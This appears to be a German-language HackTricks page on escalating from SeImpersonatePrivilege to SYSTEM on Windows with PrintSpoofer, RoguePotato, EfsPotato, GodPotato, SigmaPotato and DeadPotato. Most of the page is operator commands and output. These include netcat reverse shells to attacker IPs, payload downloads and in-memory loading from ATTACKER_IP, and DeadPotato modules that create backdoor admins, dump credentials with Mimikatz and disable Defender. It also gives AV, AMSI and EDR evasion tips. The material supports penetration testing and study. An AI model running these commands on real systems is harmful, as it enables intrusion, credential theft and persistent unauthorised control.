# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato funktioniert nicht** unter Windows Server 2019 und Windows 10 ab Build 1809. Allerdings können [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** verwendet werden, um **dieselben Berechtigungen auszunutzen und Zugriff auf der Ebene von `NT AUTHORITY\SYSTEM`** zu erlangen. Dieser [Blogbeitrag](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) behandelt das Tool `PrintSpoofer` ausführlich. Es kann verwendet werden, um Impersonation-Berechtigungen auf Windows-10- und Server-2019-Hosts auszunutzen, auf denen JuicyPotato nicht mehr funktioniert.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Eine moderne, in den Jahren 2024–2025 häufig gepflegte Alternative ist SigmaPotato (ein Fork von GodPotato), das die Verwendung von In-Memory-/.NET-Reflection sowie eine erweiterte Betriebssystemunterstützung ergänzt. Siehe die kurze Verwendung unten und das Repository in den Referenzen.

Verwandte Seiten mit Hintergrundinformationen und manuellen Techniken:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Voraussetzungen und häufige Fallstricke

Alle folgenden Techniken basieren auf dem Ausnutzen eines privilegierten Dienstes, der Impersonation unterstützt, aus einem Kontext, der über eine der folgenden Berechtigungen verfügt:

- SeImpersonatePrivilege (am häufigsten) oder SeAssignPrimaryTokenPrivilege
- Hohe Integrität ist nicht erforderlich, wenn das Token bereits über SeImpersonatePrivilege verfügt (typisch für viele Dienstkonten wie IIS AppPool, MSSQL usw.)

Berechtigungen schnell überprüfen:
```cmd
whoami /priv | findstr /i impersonate
```
Betriebshinweise:

- Wenn deine Shell unter einem eingeschränkten Token ohne SeImpersonatePrivilege läuft (in manchen Kontexten häufig bei Local Service/Network Service), stelle die Standardberechtigungen des Kontos mit FullPowers wieder her und führe anschließend einen Potato aus. Beispiel: `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- PrintSpoofer benötigt, dass der Print Spooler-Dienst läuft und über den lokalen RPC-Endpunkt (spoolss) erreichbar ist. In gehärteten Umgebungen, in denen der Spooler nach PrintNightmare deaktiviert wurde, solltest du RoguePotato/GodPotato/DCOMPotato/EfsPotato bevorzugen.
- RoguePotato benötigt einen über TCP/135 erreichbaren OXID-Resolver. Wenn der Egress blockiert ist, verwende einen Redirector/Port-Forwarder (siehe Beispiel unten). Ältere Builds benötigten das -f-Flag.
- EfsPotato/SharpEfsPotato missbrauchen MS-EFSR. Wenn eine Pipe blockiert ist, versuche alternative Pipes (lsarpc, efsrpc, samr, lsass, netlogon).
- Der Fehler 0x6d3 während RpcBindingSetAuthInfo weist typischerweise auf einen unbekannten/nicht unterstützten RPC-Authentifizierungsdienst hin. Versuche eine andere Pipe/einen anderen Transport oder stelle sicher, dass der Zieldienst läuft.
- „Kitchen-sink“-Forks wie DeadPotato bündeln zusätzliche Payload-Module (Mimikatz/SharpHound/Defender off), die auf die Festplatte schreiben; erwarte im Vergleich zu den schlanken Originalen eine höhere EDR-Erkennung.

## Schnelle Demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Hinweise:
- Du kannst `-i` verwenden, um einen interaktiven Prozess in der aktuellen Konsole zu starten, oder `-c`, um einen One-Liner auszuführen.
- Erfordert den Spooler-Dienst. Wenn dieser deaktiviert ist, schlägt dies fehl.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Wenn der ausgehende Port 135 blockiert ist, leite den OXID resolver über socat auf deinem redirector weiter:<sup>[[9]](#references)</sup>
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato ist ein neuerer COM-abuse primitive, der Ende 2022 veröffentlicht wurde und den **PrintNotify**-Dienst anstelle von Spooler/BITS angreift. Die Binary instanziiert den PrintNotify-COM-Server, ersetzt `IUnknown` durch ein gefälschtes Objekt und löst anschließend über `CreatePointerMoniker` einen privilegierten Callback aus. Wenn sich der PrintNotify-Dienst (der als **SYSTEM** ausgeführt wird) zurückverbindet, dupliziert der Prozess das zurückgegebene Token und startet die angegebene Payload mit vollständigen Privilegien.<sup>[[13]](#references)</sup>

Wichtige Hinweise zum Betrieb:

* Funktioniert unter Windows 10/11 und Windows Server 2012–2022, sofern der Print Workflow/PrintNotify-Dienst installiert ist (er ist auch dann vorhanden, wenn der Legacy-Spooler nach PrintNightmare deaktiviert wurde).
* Erfordert, dass der aufrufende Kontext über `SeImpersonatePrivilege` verfügt (typisch für IIS APPPOOL-, MSSQL- und Scheduled-Task-Servicekonten).
* Akzeptiert entweder einen direkten Befehl oder einen interaktiven Modus, sodass du innerhalb der ursprünglichen Konsole bleiben kannst. Beispiel:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Da es vollständig auf COM basiert, sind keine Named-Pipe-Listener oder externen Redirectors erforderlich. Dadurch ist es ein direkter Ersatz auf Hosts, auf denen Defender das RPC-Binding von RoguePotato blockiert.

Operatoren wie Ink Dragon führen PrintNotifyPotato unmittelbar nach dem Erlangen von ViewState RCE auf SharePoint aus, um vom `w3wp.exe`-Worker zu SYSTEM zu pivotieren, bevor sie ShadowPad installieren.<sup>[[14]](#references)</sup>

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Tipp: Wenn eine Pipe fehlschlägt oder EDR sie blockiert, versuche die andere unterstützte Pipe:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Hinweise:
- Funktioniert unter Windows 8/8.1–11 und Server 2012–2022, wenn SeImpersonatePrivilege vorhanden ist.
- Verwende die Binärdatei, die zur installierten Laufzeit passt (z. B. `GodPotato-NET4.exe` auf modernen Server-2022-Systemen).
- Wenn dein initialer Ausführungs-Primitiv ein Webshell/UI mit kurzen Timeouts ist, stelle die Payload als Script bereit und lass GodPotato sie ausführen, anstatt einen langen Inline-Befehl zu verwenden.<sup>[[12]](#references)</sup>

Schnelles Staging-Muster aus einem beschreibbaren IIS-Webroot:
```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```
### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato bietet zwei Varianten für Dienst-DCOM-Objekte, die standardmäßig RPC_C_IMP_LEVEL_IMPERSONATE verwenden. Erstelle die bereitgestellten Binaries oder verwende sie und führe deinen Befehl aus:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (aktualisierter GodPotato-Fork)

SigmaPotato fügt moderne Funktionen hinzu, etwa die In-Memory-Ausführung mittels .NET-Reflection sowie einen PowerShell-Reverse-Shell-Helfer.<sup>[[8]](#references)</sup>
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Zusätzliche Vorteile in Builds von 2024–2025 (v1.2.x):
- Integriertes reverse shell-Flag `--revshell` und Entfernung des 1024-Zeichen-Limits von PowerShell, sodass du lange AMSI-bypassende payloads in einem Durchgang ausführen kannst.
- Reflection-freundliche Syntax (`[SigmaPotato]::Main()`), plus ein rudimentärer AV-evasion-Trick über `VirtualAllocExNuma()`, um einfache Heuristiken zu umgehen.
- Separates `SigmaPotatoCore.exe`, kompiliert für .NET 2.0 und PowerShell Core-Umgebungen.

### DeadPotato (GodPotato-Rework von 2024 mit Modulen)

DeadPotato behält die GodPotato-OXID/DCOM-Impersonation-Chain bei, integriert jedoch post-exploitation-Helfer, sodass Operatoren sofort SYSTEM übernehmen und Persistence/Collection ohne zusätzliche Tools durchführen können.<sup>[[15]](#references)</sup>

Häufige Module (alle erfordern SeImpersonatePrivilege):

- `-cmd "<cmd>"` — beliebigen Befehl als SYSTEM starten.
- `-rev <ip:port>` — schnelle reverse shell.
- `-newadmin user:pass` — einen lokalen Administrator für Persistence erstellen.
- `-mimi sam|lsa|all` — Mimikatz ablegen und ausführen, um Credentials zu dumpen (greift auf die Festplatte zu, auffällig).
- `-sharphound` — SharpHound-Collection als SYSTEM ausführen.
- `-defender off` — den Echtzeitschutz von Defender deaktivieren (sehr auffällig).

Beispiele für One-Liner:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Da zusätzliche Binaries enthalten sind, solltest du mit mehr AV/EDR-Flags rechnen; wenn Stealth wichtig ist, verwende das schlankere GodPotato/SigmaPotato.

## Referenzen

- [1] [PrintSpoofer – Missbrauch von Impersonation-Privileges unter Windows 10 und Server 2019](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [Kein JuicyPotato mehr? Alte Geschichte, willkommen RoguePotato](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers – Standardmäßige Token-Privileges für Service-Accounts wiederherstellen](https://github.com/itm4n/FullPowers)
- [11] [HTB: Media — WMP-NTLM-leak → NTFS-Junction zum Webroot-RCE → FullPowers + GodPotato zu SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB: Job — LibreOffice-Makro → IIS-Webshell → GodPotato zu SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Check Point Research – Einblicke in Ink Dragon: Das Relay-Netzwerk und die internen Abläufe einer verdeckten offensiven Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato – GodPotato-Rework mit integrierten Post-Ex-Modulen](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
